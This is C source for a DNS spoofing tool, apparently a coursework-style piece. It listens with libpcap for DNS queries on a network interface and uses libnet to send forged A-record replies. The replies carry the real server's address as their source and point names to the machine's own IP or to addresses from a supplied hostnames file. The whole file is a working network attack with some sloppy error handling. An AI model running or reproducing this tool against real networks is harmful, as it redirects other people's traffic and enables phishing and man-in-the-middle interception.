#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/queue.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <arpa/nameser_compat.h>
#include <resolv.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include <time.h>

/* Ethernet addresses are 6 bytes */
#define SIZE_ETHERNET 14
#define PKT_LENGTH 16
#define IP_HL(ip)       (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)        (((ip)->ip_vhl) >> 4)

#define DBG printf("Line:%d\n",__LINE__);

    /* Ethernet header */
struct sniff_ethernet {
    u_char dst[ETHER_ADDR_LEN]; /* Destination host address */
    u_char src[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
 };

struct info {
	in_addr_t ip;
	char host[MAXHOSTNAMELEN];
	struct info* next;
};

u_int32_t  local_ip = -1;
libnet_t *l;
struct info *list = NULL;


void process_packet(u_char *string, const struct pcap_pkthdr *header,
        const u_char *packet)
{
	char domain[MAXHOSTNAMELEN];
	HEADER *dns;
	u_char *pt, *pktend;
	char resp[1024];
	int i, dnslen;
	in_addr_t dst_ip=NULL;
	u_short dnstype, dnsclass;
	struct libnet_ipv4_hdr *ip;
	struct libnet_udp_hdr *udp;
		
	ip = (struct libnet_ipv4_hdr *)(packet + SIZE_ETHERNET);
	udp = (struct libnet_udp_hdr *)(packet + SIZE_ETHERNET + (ip->ip_hl * 4));
	dns = (HEADER *)(udp + 1);

	if (dns->opcode != QUERY || dns->nscount || dns->arcount)
		return;
	
	pt = (u_char *)(dns + 1);
	pktend = (u_char *)packet + header->caplen;
	dnslen = pktend - (u_char *)dns;
	i = dn_expand((u_char *)dns, pktend, pt, domain, sizeof(domain));
	if (i<0)
        return;
	pt += i;
	GETSHORT(dnstype, pt);
	GETSHORT(dnsclass, pt);

	if (dnsclass != 1)
		return;

	pt = resp + dnslen;
	if (dnstype == T_A) {
		if(list) {
			struct info* tmp = list;
			while(tmp) {
				if(strcmp(tmp->host,domain)==0) {
					dst_ip = tmp->ip;
					break;
				}
				tmp = tmp->next;
			}
		} else {
			dst_ip = local_ip;
		}
		if (!dst_ip)
			return;
		memcpy(pt, "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04", 12);
		memcpy(pt + 12, &dst_ip, sizeof(dst_ip));
	} else {
		return;
	}

	memcpy(resp, (u_char *)dns, dnslen);

	dns = (HEADER *)resp;
	dns->qr = 1;
	dns->ra = 1;
	dns->ancount = htons(1);
	dnslen += PKT_LENGTH;
		
	libnet_clear_packet(l);
	libnet_build_udp(ntohs(udp->uh_dport), ntohs(udp->uh_sport),
					 LIBNET_UDP_H + dnslen, 0, (u_int8_t *)resp, dnslen, l, 0);

	libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_UDP_H + dnslen, 0,
			  libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_UDP, 0,
			  ip->ip_dst.s_addr, ip->ip_src.s_addr, NULL, 0, l, 0);
	
	if (libnet_write(l) < 0) {
		printf( "NOT WRITTEN\n");
	}

	return;
}

static void
dns_init(char *interface)
{

	FILE *fp;
	char errbuf[LIBNET_ERRBUF_SIZE];

	l = libnet_init(LIBNET_LINK, interface, errbuf);
	if ( l == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}	
	
	local_ip = libnet_get_ipaddr4(l);
	if (local_ip == -1) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}

	libnet_destroy(l);
	
	l = libnet_init(LIBNET_RAW4, interface, errbuf);
	if ( l == NULL ) {
		fprintf(stderr, "Could not initialize libnet: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}	
	
	libnet_seed_prand(l);
}

void set_hostnames(char * hostnames)
{
    FILE *fp;
    fp = fopen(hostnames,"r");
    if (!fp) {
		printf( "Give correct file name\n"); 
	}
	char *line = NULL;
	size_t len = 0;
    size_t read;
	

    while ((read = getline(&line, &len, fp)) != -1) {
	
		struct info* tmp = (struct info*)malloc(sizeof(struct info));
		if (read < 17)
			return;
		char ip[16];

		char* ltmp = line;
		int i=0;
		while(ltmp && !isspace(*ltmp) && i< 16){
			ip[i++] = ltmp[0];
			ltmp++;
		}
		ip[15] = '\0';
		tmp->ip = inet_addr(ip);

		while (ltmp && isspace(*ltmp))
			ltmp++;

		if(!ltmp)
			return;
		
		i=0;
		while(ltmp && !isspace(*ltmp) && i< MAXHOSTNAMELEN){
			tmp->host[i++] = ltmp[0];
			ltmp++;
		}
		tmp->host[i] = '\0';
		tmp->next = list;
		list =  tmp;
    }

    free(line);
    fclose(fp);

}

int main(int argc, char* argv[])
{
	char* interface=NULL;
	char* hostnames=NULL;
	char* expression=NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;      /* The compiled filter */    
    bpf_u_int32 net = 0;        
	u_int mask = 0;
	int  ch;
	pcap_t *handle;


	while ((ch = getopt(argc, argv, "i:f:")) != -1) {
		switch(ch) {
		case 'i': 
				interface = optarg; 
			break;
		
		case 'f':
				hostnames  = optarg;
			break;
		case '?':
				printf("Please provide valid arguments\n");
		}		
	}

	argv+=optind;
	u_int exp_len = 0;

    if (argc > optind) {
		if (!(*argv))
			return 1;

        char **tmp;
        tmp = argv;
        while (*tmp) {
            exp_len += strlen(*tmp) + 1;
			tmp++;
		}
        expression = (char*) malloc(exp_len);
        tmp = argv;
		char *src;
        char *tmp2 = expression;

        while ((src = *tmp++) != NULL) {
            while ((*tmp2 = *src) != '\0'){
				tmp2++;
				src++;
			}
            tmp2[0] = ' ';
			tmp2++;
        }
        tmp2[0] = '\0';
	}

	char exp[20+ exp_len];
	if (expression) {
		sprintf(exp, "udp dst port 53 and ");
		sprintf(exp + 20 , "%s", expression);
	} else {
		sprintf(exp, "udp dst port 53");
		exp[15] = '\0';
	}

	printf("%s\n",exp);    
	if(hostnames) {
		set_hostnames(hostnames);
		struct info* tmp = list;
		while(tmp) {
			tmp = tmp->next;
		}
		
	}

	if (!interface) {
		interface = pcap_lookupdev(errbuf);
		if (interface == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return 1;
		}
	} else {
    	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	    if (handle == NULL) {
		    fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		    return 1;
	    }
    }

	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
		return 1;
	}

	if (pcap_datalink(handle) != DLT_EN10MB) {
		printf(" Interface %s do not use ethernet\n", interface);
		return 1;
	}

    if (expression) {
        if (pcap_compile(handle, &fp, exp, 0, net) == -1) {
            fprintf(stderr, "Couldn't parse filter %s: %s\n", exp, pcap_geterr(handle));
            return 1;
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Couldn't install filter %s: %s\n", exp, pcap_geterr(handle));
            return 1;
        }        
    }

	printf("listening on  %s,", interface);
	printf(" link-type EN10MB (Ethernet)\n");

	dns_init(interface);

    pcap_loop(handle, 0, process_packet, NULL);
	
    pcap_close(handle);

	printf("Complete\n");
    return 0;
}    
